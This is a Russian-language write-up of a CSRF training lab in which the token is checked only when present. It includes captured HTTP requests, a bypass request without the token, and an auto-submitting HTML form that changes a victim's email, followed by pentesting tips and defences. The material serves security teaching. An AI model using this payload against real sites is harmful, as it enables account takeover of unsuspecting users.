<a id="goal"></a>
## 🎯 Цель
Функционал смены email защищён CSRF-токеном, но валидация реализована некорректно — она выполняется только при наличии токена в запросе. Задача:

1. Использовать exploit server для размещения HTML-страницы с CSRF-атакой.
2. Изменить email жертвы через CSRF.

<a id="theory"></a>
## 🧠 Краткая теория
CSRF (Cross-Site Request Forgery) — атака, при которой злоумышленник заставляет браузер жертвы выполнить нежелательное действие на уязвимом сайте, где жертва аутентифицирована.

Стандартная защита — CSRF-токен, который должен присутствовать и быть корректным в каждом state-changing запросе. Частая ошибка реализации — **условная валидация**: сервер проверяет токен, только если параметр существует в запросе. Если параметр отсутствует полностью, логика проверки пропускается и запрос обрабатывается как доверенный. Защита, которую можно обойти простым отсутствием параметра, эквивалентна отсутствию защиты.

<a id="idea"></a>
## 🧩 Ключевая идея
Простое удаление параметра `csrf` из запроса обходит проверку токена.

- Сервер проверяет токен только при его наличии; отсутствие параметра полностью пропускает проверку.
- Эксплойт-форма поэтому **вообще не содержит** инпута `csrf` — знание токена жертвы не требуется.
- Автосабмит формы через JavaScript делает атаку незаметной для жертвы.

<a id="attack-scheme"></a>
## 🗺 Схема атаки
1. **Разведка:** Перехват `POST /my-account/change-email` с csrf-токеном.
2. **Проверка:** Изменение значения csrf → отказ (токен валидируется).
3. **Обход:** Полное удаление параметра csrf → запрос принят.
4. **Эксплойт:** HTML-форма без csrf-инпута + автосабмит.
5. **Проверка:** View exploit на себе → email изменён.
6. **Доставка:** Deliver to victim → лаба решена.

<a id="step1"></a>
## 🔍 Шаг 1 — Анализ легитимного запроса
Авторизовался под `wiener:peter` в браузере Burp, отправил форму «Update email» и перехватил запрос в Burp Proxy.

```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN
```

<a id="step2"></a>
## 🔍 Шаг 2 — Проверка валидации токена
Отправил запрос в Burp Repeater, изменил значение `csrf` на произвольное → сервер отклонил запрос. Токен проверяется при его наличии.

<a id="step3"></a>
## 🔍 Шаг 3 — Удаление csrf-параметра
Полностью удалил параметр `csrf` из тела запроса и повторил отправку:

```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com
```

**Результат:** запрос **принят**, email изменён — валидация пропускается при отсутствии токена.

*Вывод: защита срабатывает только при наличии параметра; отсутствие = доверие.*

<a id="step4"></a>
## 🔍 Шаг 4 — Формирование CSRF-эксплойта
Сгенерировал PoC через правый клик → Engagement tools → **Generate CSRF PoC** (с включенным auto-submit script) или вручную:

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@web-security-academy.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

*Важно: в форме нет инпута `csrf` — сервер его не потребует.*

<a id="step5"></a>
## 🔍 Шаг 5 — Проверка эксплойта на себе
Разместил HTML в теле exploit-сервера, сохранил, нажал «View exploit». В Burp Proxy убедился, что POST проходит без csrf-параметра и email меняется. Затем изменил адрес в эксплойте, чтобы он не совпадал с текущим.

<a id="step6"></a>
## 🔍 Шаг 6 — Доставка эксплойта жертве
Сохранил эксплойт и нажал «Deliver to victim». Email жертвы изменён → лаба решена.

<a id="requests"></a>
## 📨 Примеры запросов
**Легитимный POST (с токеном)**
```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN
```

**Обход (параметр csrf полностью отсутствует)**
```http
POST /my-account/change-email HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_COOKIE
Content-Type: application/x-www-form-urlencoded

email=attacker@web-security-academy.net
```

<a id="response"></a>
## 📥 Пример результата
**Проверка валидации токена**
- POST с изменённым csrf → "Invalid CSRF token" (отказ)
- POST с корректным csrf → 302 Redirect (успех)

**Обход**
- POST **вообще без параметра csrf** → 302 Redirect (успех)  
→ Email изменён без какой-либо проверки токена

<a id="attack-chain"></a>
## 🧾 Полная цепочка атаки
1. `POST /my-account/change-email` → перехват, есть csrf-токен.
2. Repeater → изменение csrf → отказ (токен валидируется при наличии).
3. Удаление параметра csrf → запрос принят.
4. Exploit Server → HTML-форма без csrf-инпута + автосабмит.
5. View exploit → проверка на себе → email изменён.
6. Deliver to victim → email жертвы изменён → **Solved**.

<a id="breakdown"></a>
## 🔬 Почему атака сработала
- **Условная валидация:** сервер проверяет токен только при существовании параметра; отсутствие параметра пропускает проверку вместо отклонения запроса.
- **Логика fail-open:** валидатор трактует «нет токена» как «нечего проверять», а не как нарушение политики.
- **Знание токена не требуется:** атакующему не нужно получать или угадывать CSRF-токен жертвы — достаточно его отсутствия.
- **Автосабмит:** JavaScript отправляет форму мгновенно, жертва не замечает атаки.

<a id="pentester"></a>
## 🧠 Как думать как пентестер
1. **Сначала попробуйте удалить токен:** простейший обход CSRF — если запрос проходит без него, защита неполная.
2. **Сначала проверьте модификацию:** изменение значения показывает, проверяется ли токен вообще при наличии.
3. **Проверяйте расположение параметра:** удаляйте токен из body, query string и headers по отдельности.
4. **Используйте Generate CSRF PoC:** Burp Pro собирает готовый эксплойт из перехваченного запроса.
5. **Всегда тестируйте на себе:** «View exploit» подтверждает, что запрос проходит без токена, до доставки жертве.

<a id="mistakes"></a>
## ❌ Типичные ошибки
- **Оставили csrf-инпут в эксплойт-форме:** если токен присутствует, но неверен, запрос отклоняется — параметр нужно удалить полностью.
- **Только изменение значения токена:** смена значения показывает наличие проверки; обход требует полного удаления.
- **Забыли сменить email в эксплойте:** если адрес совпадает с текущим, изменение не происходит — лаба не засчитывается.
- **Забыли автосабмит:** без `<script>` форма не отправится автоматически.
- **Неверный URL лабы:** action должен указывать на реальный LAB-ID.

<a id="defense"></a>
## 🛡 Защита
- **Отклонять запросы с отсутствующим CSRF-токеном** — валидация обязательна для каждого state-changing запроса; отсутствие токена — это ошибка, а не повод пропустить проверку.
- Использовать CSRF-защиту уровня фреймворка (встроенные middleware) вместо самописной условной логики.
- **SameSite-cookies** (Lax/Strict) как эшелонированная защита.
- Проверка заголовков **Origin/Referer** для запросов, изменяющих состояние.
- Централизовать валидацию в едином фильтре/интерцепторе, чтобы ни один endpoint не был доступен без неё.

<a id="conclusion"></a>
## 🧾 Итог
Лаба демонстрирует ошибку валидации типа fail-open: токен проверяется только при его наличии в запросе. Ключевой урок: проверка, которую можно обойти отсутствием входного параметра, — не проверка вовсе; валидация должна отклонять любой запрос без корректного токена. Простое удаление параметра `csrf` обошло защиту, а HTML-форма без токена позволила изменить email жертвы.
